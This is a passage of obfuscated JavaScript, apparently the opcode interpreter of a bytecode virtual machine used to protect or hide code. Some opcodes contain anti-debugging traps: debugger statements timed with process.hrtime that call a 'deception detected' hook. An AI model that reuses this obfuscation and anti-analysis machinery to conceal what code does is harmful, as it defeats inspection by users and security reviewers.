0x64:{yN:{let Ce=ja[--jn],Ch=typeof Ce==='object'?Ce:jv(Ce),Cc=Ch&&Ch[0x4],Cp=Ch&&Ch[0x12],l0=Ch&&Ch[0x7],l1=Ch&&Ch[0x10],l2=Ch&&Ch[0xb]||0x0,l3=Ch&&Ch[0x1],l4=Cc?CY['_$LX6iYq']:undefined,l5=CY['_$UP7JxF'],l6;if(l0)l6=I(jD,Ce,l5,b,l3,vmd);else{if(Cp){if(Cc)l6=u(jS,Ce,l5,l4);else l1?l6=z(jS,Ce,l5,l3,vmd):l6=s(jS,Ce,l5,l3,vmd);}else{if(Cc)l6=W(T,Ce,l5,l4);else l1?l6=O(T,Ce,l5,l3,vmd):l6=J(T,Ce,l5,l3,vmd);}}Y(l6,'length',{'value':l2,'writable':![],'enumerable':![],'configurable':!![]}),ja[jn++]=l6,jw++;}break;}case 0xb4:{yy:{let l7=ja[--jn],l8=ja[--jn],l9=ja[jn-0x1];vmZ(l9['prototype'],l8,{'value':l7,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x90:{yx:{let lj=ja[--jn],lC=ja[jn-0x1],ll=jJ[Cw];vmZ(lC['prototype'],ll,{'value':lj,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x5e:{yi:{let lE=ja[--jn],lN=ja[jn-0x1];if(Array['isArray'](lE))Array['prototype']['push']['apply'](lN,lE);else for(let ly of lE){lN['push'](ly);}jw++;}break;}case 0xa4:{yg:{ja[jn++]=jr,jw++;}break;}case 0x98:{yf:{let lx=ja[--jn],li=ja[--jn],lg=jJ[Cw],lf=A();!lf['has'](lg)&&lf['set'](lg,new WeakMap());let lU=lf['get'](lg);if(lU['has'](li))throw new TypeError('Cannot\x20initialize\x20'+lg+'\x20twice\x20on\x20the\x20same\x20object');lU['set'](li,lx),jw++;}break;}case 0x7c:{yU:{let ld=ja[--jn];ld&&typeof ld['return']==='function'&&ld['return'](),jw++;}break;}case 0x97:{yd:{let lM=ja[--jn],lb=ja[--jn],lZ=jJ[Cw],lY=A(),lG='set_'+lZ,lv=lY['get'](lG);if(lv&&lv['has'](lb)){let lF=lv['get'](lb);lF['call'](lb,lM),ja[jn++]=lM,jw++;break yd;}let lS='_$6ROloL'+'set_'+lZ['substring'](0x1)+'_$AZoxSE';if(lb['constructor']&&lS in lb['constructor']){let lK=lb['constructor'][lS];lK['call'](lb,lM),ja[jn++]=lM,jw++;break yd;}let lD=lY['get'](lZ);if(lD&&lD['has'](lb)){lD['set'](lb,lM),ja[jn++]=lM,jw++;break yd;}let lB=q(lZ);if(lB in lb){lb[lB]=lM,ja[jn++]=lM,jw++;break yd;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+lZ+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x8c:{yM:{let lQ=ja[--jn],lr=ja[--jn],lA=Cw,la=function(ln,lq){let lw=function(){if(ln){lq&&(vmg_717f62['_$v1TyU6']=lw);let lJ='_$L4iaoq'in vmg_717f62;!lJ&&(vmg_717f62['_$L4iaoq']=new.target);try{let ls=ln['apply'](this,S(arguments));if(lq&&ls!==undefined&&(typeof ls!=='object'||ls===null))throw new TypeError('Derived\x20constructors\x20may\x20only\x20return\x20object\x20or\x20undefined');return ls;}finally{lq&&delete vmg_717f62['_$v1TyU6'],!lJ&&delete vmg_717f62['_$L4iaoq'];}}};return lw;}(lr,lA);lQ&&vmZ(la,'name',{'value':lQ,'configurable':!![]}),ja[jn++]=la,jw++;}break;}case 0x94:{yb:{let ln=ja[--jn],lq=ja[jn-0x1],lw=jJ[Cw];vmZ(lq,lw,{'get':ln,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x6e:{yZ:{ja[jn-0x1]=typeof ja[jn-0x1],jw++;}break;}case 0xa1:{yY:{if(CC===null){if(CY['_$wPHaOR']||!CY['_$7AWJXJ']){let lJ=CY['_$mncnwJ']||jF,ls=lJ?lJ['length']:0x0;CC=vmY(Object['prototype']);for(let lI=0x0;lI<ls;lI++){CC[lI]=lJ[lI];}vmZ(CC,'length',{'value':ls,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(CC,Symbol['iterator'],{'value':Array['prototype'][Symbol['iterator']],'writable':!![],'enumerable':![],'configurable':!![]}),CC=new Proxy(CC,{'has':function(lW,lu){if(lu===Symbol['toStringTag'])return![];return lu in lW;},'get':function(lW,lu,lO){if(lu===Symbol['toStringTag'])return'Arguments';return Reflect['get'](lW,lu,lO);}}),CY['_$wPHaOR']?vmZ(CC,'callee',{'get':d,'set':d,'enumerable':![],'configurable':![]}):vmZ(CC,'callee',{'value':jQ,'writable':!![],'enumerable':![],'configurable':!![]});}else{let lW=jF?jF['length']:0x0,lu={},lO={},lz=jQ,lo=![],lt=!![],lk={},lT=function(lV){if(typeof lV!=='string')return NaN;let lH=+lV;return lH>=0x0&&lH%0x1===0x0&&String(lH)===lV?lH:NaN;},lX=function(lV){return!isNaN(lV)&&lV>=0x0;},lL=function(lV){if(lV in lO)return undefined;if(lV in lu)return lu[lV];return lV<jF['length']?jF[lV]:undefined;},lR=function(lV){if(lV in lO)return![];if(lV in lu)return!![];return lV<jF['length']?lV in jF:![];},lm={};vmZ(lm,'length',{'value':lW,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(lm,'callee',{'value':jQ,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(lm,Symbol['iterator'],{'value':Array['prototype'][Symbol['iterator']],'writable':!![],'enumerable':![],'configurable':!![]}),CC=new Proxy(lm,{'get':function(lV,lH,lP){if(lH==='length')return lW;if(lH==='callee')return lo?undefined:lz;if(lH===Symbol['toStringTag'])return'Arguments';let le=lT(lH);if(lX(le)){if(le in lk)return Reflect['get'](lV,lH,lP);return lL(le);}return Reflect['get'](lV,lH,lP);},'set':function(lV,lH,lP){if(lH==='length'){if(!lt)return![];return lW=lP,lV['length']=lP,!![];}if(lH==='callee')return lz=lP,lo=![],lV['callee']=lP,!![];let le=lT(lH);if(lX(le)){if(le in lk)return Reflect['set'](lV,lH,lP);let lh=vmG(lV,String(le));if(lh&&!lh['writable'])return![];if(le in lO)delete lO[le],lu[le]=lP;else le<jF['length']?jF[le]=lP:lu[le]=lP;return!![];}return lV[lH]=lP,!![];},'has':function(lV,lH){if(lH==='length')return!![];if(lH==='callee')return!lo;if(lH===Symbol['toStringTag'])return![];let lP=lT(lH);if(lX(lP)){if(String(lP)in lV)return!![];return lR(lP);}return lH in lV;},'defineProperty':function(lV,lH,lP){if(lH==='length')return'value'in lP&&(lW=lP['value']),'writable'in lP&&(lt=lP['writable']),vmZ(lV,lH,lP),!![];if(lH==='callee')return'value'in lP&&(lz=lP['value']),lo=![],vmZ(lV,lH,lP),!![];let le=lT(lH);if(lX(le)){if('get'in lP||'set'in lP)lk[le]=0x1,le in lu&&delete lu[le],le in lO&&delete lO[le];else'value'in lP&&(le<jF['length']&&!(le in lO)?jF[le]=lP['value']:(lu[le]=lP['value'],le in lO&&delete lO[le]));return vmZ(lV,String(le),lP),!![];}return vmZ(lV,lH,lP),!![];},'deleteProperty':function(lV,lH){if(lH==='callee')return lo=!![],delete lV['callee'],!![];let lP=lT(lH);return lX(lP)&&(lP in lk&&delete lk[lP],lP<jF['length']?lO[lP]=0x1:delete lu[lP]),delete lV[lH],!![];},'preventExtensions':function(lV){let lH=jF?jF['length']:0x0;for(let lP=0x0;lP<lH;lP++){!(lP in lO)&&!vmG(lV,String(lP))&&vmZ(lV,String(lP),{'value':lL(lP),'writable':!![],'enumerable':!![],'configurable':!![]});}for(let le in lu){!vmG(lV,le)&&vmZ(lV,le,{'value':lu[le],'writable':!![],'enumerable':!![],'configurable':!![]});}return Object['preventExtensions'](lV),!![];},'getOwnPropertyDescriptor':function(lV,lH){if(lH==='callee'){if(lo)return undefined;return vmG(lV,'callee');}if(lH==='length')return vmG(lV,'length');let lP=lT(lH);if(lX(lP)){if(lP in lk)return vmG(lV,lH);if(lR(lP)){let lh=vmG(lV,String(lP));return{'value':lL(lP),'writable':lh?lh['writable']:!![],'enumerable':lh?lh['enumerable']:!![],'configurable':lh?lh['configurable']:!![]};}return vmG(lV,lH);}let le=vmG(lV,lH);if(le)return le;return undefined;},'ownKeys':function(lV){let lH=[],lP=jF?jF['length']:0x0;for(let lh=0x0;lh<lP;lh++){!(lh in lO)&&lH['push'](String(lh));}for(let lc in lu){lH['indexOf'](lc)===-0x1&&lH['push'](lc);}lH['push']('length');!lo&&lH['push']('callee');let le=Reflect['ownKeys'](lV);for(let lp=0x0;lp<le['length'];lp++){lH['indexOf'](le[lp])===-0x1&&lH['push'](le[lp]);}return lH;}});}}ja[jn++]=CC,jw++;}break;}case 0x5d:{yG:{let lV=ja[--jn],lH={'value':Array['isArray'](lV)?lV:Array['from'](lV)};M['add'](lH),ja[jn++]=lH,jw++;}break;}case 0x8e:{yv:{let lP=ja[--jn],le=ja[--jn],lh=vmg_717f62['_$yi8Vf9'],lc=lh?vmB(lh):B(le),lp=F(lc,lP);if(lp['desc']&&lp['desc']['get']){let E1=lp['desc']['get']['call'](le);ja[jn++]=E1,jw++;break yv;}if(lp['desc']&&lp['desc']['set']&&!('value'in lp['desc'])){ja[jn++]=undefined,jw++;break yv;}let E0=lp['proto']?lp['proto'][lP]:lc[lP];if(typeof E0==='function'){let E2=lp['proto']||lc,E3=E0['bind'](le),E4=E0['constructor']&&E0['constructor']['name'],E5=E4==='GeneratorFunction'||E4==='AsyncFunction'||E4==='AsyncGeneratorFunction';!E5&&(!vmg_717f62['_$RycY0U']&&(vmg_717f62['_$RycY0U']=new WeakMap()),vmg_717f62['_$RycY0U']['set'](E3,E2)),ja[jn++]=E3;}else ja[jn++]=E0;jw++;}break;}case 0xa9:{yS:{let E6=ja[--jn];ja[jn++]=Symbol['keyFor'](E6),jw++;}break;}case 0x8f:{yD:{let E7=ja[--jn],E8=ja[--jn],E9=ja[--jn],Ej=B(E9),EC=F(Ej,E8);EC['desc']&&EC['desc']['set']?EC['desc']['set']['call'](E9,E7):E9[E8]=E7,ja[jn++]=E7,jw++;}break;}case 0x69:{yB:{let El=ja[--jn],EE=G(C3,El),EN=ja[--jn];if(Cw===0x1){ja[jn++]=EE,jw++;break yB;}if(vmg_717f62['_$EwyF83']){jw++;break yB;}let Ey=vmg_717f62['_$stfQnK'];if(Ey){let Ex=Ey['parent'],Ei=Ey['newTarget'],Eg=Reflect['construct'](Ex,EE,Ei);jA&&jA!==Eg&&vmv(jA)['forEach'](function(Ef){!(Ef in Eg)&&(Eg[Ef]=jA[Ef]);});jA=Eg,CY['_$LXelx5']=!![];CY['_$lGK2nA']&&(K(CY['_$UP7JxF'],'__this__'),!CY['_$UP7JxF']['_$9omHYP']&&(CY['_$UP7JxF']['_$9omHYP']=vmY(null)),CY['_$UP7JxF']['_$9omHYP']['__this__']=jA);jw++;break yB;}if(typeof EN!=='function')throw new TypeError('Super\x20expression\x20must\x20be\x20a\x20constructor');vmg_717f62['_$L4iaoq']=jr;try{let Ef=EN['apply'](jA,EE);Ef!==undefined&&Ef!==jA&&typeof Ef==='object'&&(jA&&Object['assign'](Ef,jA),jA=Ef),CY['_$LXelx5']=!![],CY['_$lGK2nA']&&(K(CY['_$UP7JxF'],'__this__'),!CY['_$UP7JxF']['_$9omHYP']&&(CY['_$UP7JxF']['_$9omHYP']=vmY(null)),CY['_$UP7JxF']['_$9omHYP']['__this__']=jA);}catch(EU){if(EU instanceof TypeError&&(EU['message']['includes']('\x27new\x27')||EU['message']['includes']('constructor'))){let Ed=Reflect['construct'](EN,EE,jr);Ed!==jA&&jA&&Object['assign'](Ed,jA),jA=Ed,CY['_$LXelx5']=!![],CY['_$lGK2nA']&&(K(CY['_$UP7JxF'],'__this__'),!CY['_$UP7JxF']['_$9omHYP']&&(CY['_$UP7JxF']['_$9omHYP']=vmY(null)),CY['_$UP7JxF']['_$9omHYP']['__this__']=jA);}else throw EU;}finally{delete vmg_717f62['_$L4iaoq'];}jw++;}break;}case 0x99:{yF:{let EM=ja[--jn],Eb=jJ[Cw],EZ=![],EY=a();if(EY){let EG=EY['get'](Eb);EG&&EG['has'](EM)&&(EZ=!![]);}ja[jn++]=EZ,jw++;}break;}case 0x9c:{yK:{let Ev=ja[--jn];ja[--jn];let ES=ja[jn-0x1],ED=jJ[Cw],EB=A();!EB['has'](ED)&&EB['set'](ED,new WeakMap());let EF=EB['get'](ED);EF['set'](ES,Ev),jw++;}break;}case 0x9e:{yQ:{let EK=ja[--jn],EQ=ja[--jn],Er=jJ[Cw],EA=a();if(EA){let Eq='set_'+Er,Ew=EA['get'](Eq);if(Ew&&Ew['has'](EQ)){let Es=Ew['get'](EQ);Es['call'](EQ,EK),ja[jn++]=EK,jw++;break yQ;}let EJ=EA['get'](Er);if(EJ&&EJ['has'](EQ)){EJ['set'](EQ,EK),ja[jn++]=EK,jw++;break yQ;}}let Ea='_$6ROloL'+'set_'+Er['substring'](0x1)+'_$AZoxSE';if(Ea in EQ){let EI=EQ[Ea];EI['call'](EQ,EK),ja[jn++]=EK,jw++;break yQ;}let En=q(Er);if(En in EQ){EQ[En]=EK,ja[jn++]=EK,jw++;break yQ;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+Er+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x5b:{yr:{let EW=ja[--jn],Eu=ja[jn-0x1];Eu['push'](EW),jw++;}break;}case 0xa0:{yA:{if(CY['_$cEXkWi']&&!CY['_$LXelx5'])throw new ReferenceError('Must\x20call\x20super\x20constructor\x20in\x20derived\x20class\x20before\x20accessing\x20\x27this\x27\x20or\x20returning\x20from\x20derived\x20constructor');ja[jn++]=jA,jw++;}break;}case 0x7f:{ya:{let EO=ja[--jn];if(EO==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+EO);let Ez=EO[Symbol['iterator']];if(typeof Ez!=='function')throw new TypeError('Object\x20is\x20not\x20iterable');ja[jn++]=vmQ(Ez,EO,[]),jw++;}break;}case 0x8d:{yn:{let Eo=ja[--jn],Et=ja[jn-0x1];if(Eo===null){vmD(Et['prototype'],null),vmD(Et,Function['prototype']),Et['_$c3cS2T']=null,jw++;break yn;}if(typeof Eo!=='function')throw new TypeError('Class\x20extends\x20value\x20'+String(Eo)+'\x20is\x20not\x20a\x20constructor\x20or\x20null');let Ek=![];try{let ET=vmY(Eo['prototype']),EX=Eo['apply'](ET,[]);EX!==undefined&&EX!==ET&&(Ek=!![]);}catch(EL){EL instanceof TypeError&&(EL['message']['includes']('\x27new\x27')||EL['message']['includes']('constructor')||EL['message']['includes']('Illegal\x20constructor'))&&(Ek=!![]);}if(Ek){let ER=Et,Em=vmg_717f62,EV='_$L4iaoq',EH='_$v1TyU6',EP='_$stfQnK';function CJ(...Ee){let Eh=vmY(Eo['prototype']);Em[EP]={'parent':Eo,'newTarget':new.target||CJ},Em[EH]=new.target||CJ;let Ec=EV in Em;!Ec&&(Em[EV]=new.target);try{let Ep=ER['apply'](Eh,Ee);Ep!==undefined&&typeof Ep==='object'&&(Eh=Ep);}finally{delete Em[EP],delete Em[EH],!Ec&&delete Em[EV];}return Eh;}CJ['prototype']=vmY(Eo['prototype']),CJ['prototype']['constructor']=CJ,vmD(CJ,Eo),vmv(ER)['forEach'](function(Ee){Ee!=='prototype'&&Ee!=='length'&&Ee!=='name'&&Y(CJ,Ee,vmG(ER,Ee));});ER['prototype']&&(vmv(ER['prototype'])['forEach'](function(Ee){Ee!=='constructor'&&Y(CJ['prototype'],Ee,vmG(ER['prototype'],Ee));}),vmS(ER['prototype'])['forEach'](function(Ee){Y(CJ['prototype'],Ee,vmG(ER['prototype'],Ee));}));ja[--jn],ja[jn++]=CJ,CJ['_$c3cS2T']=Eo,jw++;break yn;}vmD(Et['prototype'],Eo['prototype']),vmD(Et,Eo),Et['_$c3cS2T']=Eo,jw++;}break;}case 0x9d:{yq:{let Ee=ja[--jn],Eh=jJ[Cw],Ec=a();if(Ec){let N1='get_'+Eh,N2=Ec['get'](N1);if(N2&&N2['has'](Ee)){let N4=N2['get'](Ee);ja[jn++]=N4['call'](Ee),jw++;break yq;}let N3=Ec['get'](Eh);if(N3&&N3['has'](Ee)){ja[jn++]=N3['get'](Ee),jw++;break yq;}}let Ep='_$6ROloL'+'get_'+Eh['substring'](0x1)+'_$AZoxSE';if(Ep in Ee){let N5=Ee[Ep];ja[jn++]=N5['call'](Ee),jw++;break yq;}let N0=q(Eh);if(N0 in Ee){ja[jn++]=Ee[N0],jw++;break yq;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+Eh+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x96:{yw:{let N6=ja[--jn],N7=jJ[Cw],N8=A(),N9='get_'+N7,Nj=N8['get'](N9);if(Nj&&Nj['has'](N6)){let NN=Nj['get'](N6);ja[jn++]=NN['call'](N6),jw++;break yw;}let NC='_$6ROloL'+'get_'+N7['substring'](0x1)+'_$AZoxSE';if(N6['constructor']&&NC in N6['constructor']){let Ny=N6['constructor'][NC];ja[jn++]=Ny['call'](N6),jw++;break yw;}let Nl=N8['get'](N7);if(Nl&&Nl['has'](N6)){ja[jn++]=Nl['get'](N6),jw++;break yw;}let NE=q(N7);if(NE in N6){ja[jn++]=N6[NE],jw++;break yw;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+N7+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x80:{yJ:{let Nx=ja[--jn];ja[jn++]=!!Nx['done'],jw++;}break;}case 0xa5:{ys:{ja[jn++]=vmM[Cw],jw++;}break;}case 0x81:{yI:{let Ni=ja[--jn];if(Ni==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+Ni);let Ng=Ni[Symbol['asyncIterator']];if(typeof Ng==='function')ja[jn++]=Ng['call'](Ni);else{let Nf=Ni[Symbol['iterator']];if(typeof Nf!=='function')throw new TypeError('Object\x20is\x20not\x20async\x20iterable');ja[jn++]=Nf['call'](Ni);}jw++;}break;}case 0x9b:{yW:{let NU=ja[--jn],Nd=jJ[Cw];if(NU==null){ja[jn++]=undefined,jw++;break yW;}let NM=A(),Nb=NM['get'](Nd);if(!Nb||!Nb['has'](NU))throw new TypeError('Cannot\x20read\x20private\x20member\x20'+Nd+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');ja[jn++]=Nb['get'](NU),jw++;}break;}case 0xb8:{yu:{let NZ=ja[--jn],NY=ja[--jn],NG=ja[jn-0x1];vmZ(NG,NY,{'get':NZ,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x93:{yO:{let Nv=ja[--jn],NS=ja[jn-0x1],ND=jJ[Cw];vmZ(NS,ND,{'value':Nv,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x5a:{yz:{ja[jn++]=[],jw++;}break;}case 0x70:{yo:{let NB=jJ[Cw];NB in vmg_717f62?ja[jn++]=typeof vmg_717f62[NB]:ja[jn++]=typeof vmd[NB],jw++;}break;}case 0x84:{yt:{let NF=ja[--jn];ja[jn++]=v(NF),jw++;}break;}case 0x83:{yk:{let NK=ja[--jn];NK&&typeof NK['return']==='function'?ja[jn++]=Promise['resolve'](NK['return']()):ja[jn++]=Promise['resolve'](),jw++;}break;}case 0xb6:{yT:{let NQ=ja[--jn],Nr=ja[--jn],NA=ja[jn-0x1],Na=D(NA);vmZ(Na,Nr,{'get':NQ,'enumerable':Na===NA,'configurable':!![]}),jw++;}break;}case 0x95:{yX:{let Nn=ja[--jn],Nq=ja[jn-0x1],Nw=jJ[Cw];vmZ(Nq,Nw,{'set':Nn,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x82:{yL:{let NJ=ja[--jn],Ns=NJ['next']();ja[jn++]=Promise['resolve'](Ns),jw++;}break;}case 0xa8:{yR:{let NI=jJ[Cw];ja[jn++]=Symbol['for'](NI),jw++;}break;}case 0x6a:{ym:{let NW=ja[--jn];ja[jn++]=import(NW),jw++;}break;}case 0x9a:{yV:{let Nu=ja[--jn],NO=ja[--jn],Nz=jJ[Cw],No=null,Nt=a();if(Nt){let NX=Nt['get'](Nz);NX&&NX['has'](NO)&&(No=NX['get'](NO));}if(No===null){let NL=w(Nz);NL in NO&&(No=NO[NL]);}if(No===null)throw new TypeError('Cannot\x20read\x20private\x20member\x20'+Nz+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');if(typeof No!=='function')throw new TypeError(Nz+'\x20is\x20not\x20a\x20function');let Nk=G(C3,Nu),NT=No['apply'](NO,Nk);ja[jn++]=NT,jw++;}break;}case 0x5f:{yH:{let NR=ja[jn-0x1];NR['length']++,jw++;}break;}case 0x92:{yP:{let Nm=ja[--jn],NV=ja[jn-0x1],NH=jJ[Cw],NP=D(NV);vmZ(NP,NH,{'set':Nm,'enumerable':NP===NV,'configurable':!![]}),jw++;}break;}case 0x91:{ye:{let Ne=ja[--jn],Nh=ja[jn-0x1],Nc=jJ[Cw],Np=D(Nh);vmZ(Np,Nc,{'get':Ne,'enumerable':Np===Nh,'configurable':!![]}),jw++;}break;}case 0xb9:{yh:{let y0=ja[--jn],y1=ja[--jn],y2=ja[jn-0x1];vmZ(y2,y1,{'set':y0,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0xb5:{yc:{let y3=ja[--jn],y4=ja[--jn],y5=ja[jn-0x1];vmZ(y5,y4,{'value':y3,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0xa7:{yp:{if(Cw===-0x1)ja[jn++]=Symbol();else{let y6=ja[--jn];ja[jn++]=Symbol(y6);}jw++;}break;}}},CD=function(Cq,Cw){switch(Cq){case 0xdd:{ls:{let Cs=Cw&0xffff,CI=Cw>>>0x10,CW=jJ[Cs],Cu=CY['_$UP7JxF'];for(let Co=0x0;Co<CI;Co++){Cu=Cu['_$IYp3QS'];}let CO=Cu['_$k25D7l'];if(CO&&CW in CO)throw new ReferenceError('Cannot\x20access\x20\x27'+CW+'\x27\x20before\x20initialization');let Cz=Cu['_$9omHYP'];ja[jn++]=Cz?Cz[CW]:undefined,jw++;}break;}case 0xdb:{lI:{let Ct=jJ[Cw],Ck=ja[--jn],CT=CY['_$UP7JxF']['_$IYp3QS'];CT&&(!CT['_$9omHYP']&&(CT['_$9omHYP']=vmY(null)),CT['_$9omHYP'][Ct]=Ck),jw++;}break;}case 0xd6:{lW:{CY['_$UP7JxF']&&CY['_$UP7JxF']['_$IYp3QS']&&(CY['_$UP7JxF']=CY['_$UP7JxF']['_$IYp3QS']),jw++;}break;}case 0xd2:{lu:{let CX=ja[--jn],CL={['_$9omHYP']:null,['_$o3JtVK']:null,['_$k25D7l']:null,['_$IYp3QS']:CX};CY['_$UP7JxF']=CL,jw++;}break;}case 0xfd:{lO:{let CR=Cw&0xffff,Cm=Cw>>>0x10;ja[jn++]=jq[CR]-jJ[Cm],jw++;}break;}case 0xfa:{lz:{jq[Cw]=jq[Cw]+0x1,jw++;}break;}case 0xfb:{lo:{jq[Cw]=jq[Cw]-0x1,jw++;}break;}case 0x10f:{lt:{if(typeof process!=='undefined'&&process['hrtime']&&process['hrtime']['bigint']){var CJ=process['hrtime']['bigint']();debugger;if(Number(process['hrtime']['bigint']()-CJ)/0xf4240>0.1)try{_setDeceptionDetected();}catch(CV){}}jw++;}break;}case 0x100:{lk:{let CH=Cw&0xffff,CP=Cw>>>0x10;ja[jn++]=jq[CH]<jJ[CP],jw++;}break;}case 0xc8:{lT:{debugger;jw++;}break;}case 0x103:{lX:{jq[Cw]=ja[--jn],jw++;}break;}case 0xc9:{lL:{jw++;}break;}case 0x104:{lR:{let Ce=jq[Cw]+0x1;jq[Cw]=Ce,ja[jn++]=Ce,jw++;}break;}case 0xd5:{lm:{ja[jn++]=CY['_$UP7JxF'],jw++;}break;}case 0xff:{lV:{let Ch=Cw&0xffff,Cc=Cw>>>0x10,Cp=jq[Ch],l0=jJ[Cc];ja[jn++]=Cp[l0],jw++;}break;}case 0x101:{lH:{let l1=Cw&0xffff,l2=Cw>>>0x10;jq[l1]<jJ[l2]?jw=jI[jw]:jw++;}break;}case 0xfc:{lP:{let l3=Cw&0xffff,l4=Cw>>>0x10;ja[jn++]=jq[l3]+jJ[l4],jw++;}break;}case 0xd7:{le:{let l5=jJ[Cw],l6=ja[--jn];K(CY['_$UP7JxF'],l5),!CY['_$UP7JxF']['_$9omHYP']&&(CY['_$UP7JxF']['_$9omHYP']=vmY(null)),CY['_$UP7JxF']['_$9omHYP'][l5]=l6,jw++;}break;}case 0xd9:{lh:{let l7=jJ[Cw],l8=ja[--jn];K(CY['_$UP7JxF'],l7);if(!CY['_$UP7JxF']['_$9omHYP'])CY['_$UP7JxF']['_$9omHYP']=vmY(null);CY['_$UP7JxF']['_$9omHYP'][l7]=l8,!CY['_$UP7JxF']['_$o3JtVK']&&(CY['_$UP7JxF']['_$o3JtVK']=vmY(null)),CY['_$UP7JxF']['_$o3JtVK'][l7]=!![],jw++;}break;}case 0x102:{lc:{let l9=Cw&0xffff,lj=Cw>>>0x10,lC=ja[--jn],ll=G(C3,lC),lE=jq[l9],lN=jJ[lj],ly=lE[lN];ja[jn++]=ly['apply'](lE,ll),jw++;}break;}case 0x105:{lp:{let lx=jq[Cw]-0x1;jq[Cw]=lx,ja[jn++]=lx,jw++;}break;}case 0xd3:{E0:{let li=jJ[Cw];if(li==='__this__'){let lb=CY['_$UP7JxF'];while(lb){if(lb['_$k25D7l']&&'__this__'in lb['_$k25D7l'])throw new ReferenceError('Cannot\x20access\x20\x27__this__\x27\x20before\x20initialization');if(lb['_$9omHYP']&&'__this__'in lb['_$9omHYP'])break;lb=lb['_$IYp3QS'];}ja[jn++]=jA,jw++;break E0;}let lg=CY['_$UP7JxF'],lf,lU=![],ld=li['indexOf']('$$'),lM=ld!==-0x1?li['substring'](0x0,ld):null;while(lg){let lZ=lg['_$k25D7l'],lY=lg['_$9omHYP'];if(lZ&&li in lZ)throw new ReferenceError('Cannot\x20access\x20\x27'+li+'\x27\x20before\x20initialization');if(lM&&lZ&&lM in lZ){if(!(lY&&li in lY))throw new ReferenceError('Cannot\x20access\x20\x27'+lM+'\x27\x20before\x20initialization');}if(lY&&li in lY){lf=lY[li],lU=!![];break;}lg=lg['_$IYp3QS'];}!lU&&(li in vmg_717f62?lf=vmg_717f62[li]:lf=vmd[li]),ja[jn++]=lf,jw++;}break;}case 0xdc:{E1:{let lG=ja[--jn],lv=jJ[Cw];if(CY['_$wPHaOR']&&!(lv in vmd)&&!(lv in vmg_717f62))throw new ReferenceError(lv+'\x20is\x20not\x20defined');vmg_717f62[lv]=lG,vmd[lv]=lG,ja[jn++]=lG,jw++;}break;}case 0xd4:{E2:{let lS=jJ[Cw],lD=ja[--jn],lB=CY['_$UP7JxF'],lF=![];while(lB){let lK=lB['_$k25D7l'],lQ=lB['_$9omHYP'];if(lK&&lS in lK)throw new ReferenceError('Cannot\x20access\x20\x27'+lS+'\x27\x20before\x20initialization');if(lQ&&lS in lQ){if(lB['_$V80HSn']&&lS in lB['_$V80HSn']){if(CY['_$wPHaOR'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');lF=!![];break;}if(lB['_$o3JtVK']&&lS in lB['_$o3JtVK'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');lQ[lS]=lD,lF=!![];break;}lB=lB['_$IYp3QS'];}if(!lF){if(lS in vmg_717f62)vmg_717f62[lS]=lD;else lS in vmd?vmd[lS]=lD:vmd[lS]=lD;}jw++;}break;}case 0xda:{E3:{let lr=jJ[Cw];!CY['_$UP7JxF']['_$k25D7l']&&(CY['_$UP7JxF']['_$k25D7l']=vmY(null)),CY['_$UP7JxF']['_$k25D7l'][lr]=!![],jw++;}break;}case 0xfe:{E4:{let lA=Cw&0xffff,la=Cw>>>0x10;ja[jn++]=jq[lA]*jJ[la],jw++;}break;}case 0xd8:{E5:{let ln=jJ[Cw],lq=ja[--jn],lw=CY['_$UP7JxF'],lJ=![];while(lw){if(lw['_$9omHYP']&&ln in lw['_$9omHYP']){if(lw['_$o3JtVK']&&ln in lw['_$o3JtVK'])break;lw['_$9omHYP'][ln]=lq;!lw['_$o3JtVK']&&(lw['_$o3JtVK']=vmY(null));lw['_$o3JtVK'][ln]=!![],lJ=!![];break;}lw=lw['_$IYp3QS'];}!lJ&&(Q(CY['_$UP7JxF'],ln),!CY['_$UP7JxF']['_$9omHYP']&&(CY['_$UP7JxF']['_$9omHYP']=vmY(null)),CY['_$UP7JxF']['_$9omHYP'][ln]=lq,!CY['_$UP7JxF']['_$o3JtVK']&&(CY['_$UP7JxF']['_$o3JtVK']=vmY(null)),CY['_$UP7JxF']['_$o3JtVK'][ln]=!![]),jw++;}break;}case 0xca:{E6:{return CZ=jn>0x0?ja[--jn]:undefined,0x1;}break;}case 0x10e:{E7:{debugger;jw++;}break;}}});switch(CQ){case 0x0:{ja[jn++]=jJ[Cr],jw++;continue;}case 0x48:{let Cq=ja[--jn],Cw=ja[--jn];if(Cw===null||Cw===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(Cq)+'\x27\x20of\x20'+Cw);ja[jn++]=Cw[Cq],jw++;continue;}case 0x4:{let CJ=ja[jn-0x1];ja[jn++]=CJ,jw++;continue;}case 0x10:{let Cs=ja[--jn];ja[jn++]=typeof Cs===f?Cs+0x1n:+Cs+0x1,jw++;continue;}case 0x2c:{let CI=ja[--jn],CW=ja[--jn];ja[jn++]=CW<CI,jw++;continue;}case 0x6:{ja[jn++]=jq[Cr],jw++;continue;}case 0x34:{!ja[--jn]?jw=jI[jw]:jw++;continue;}case 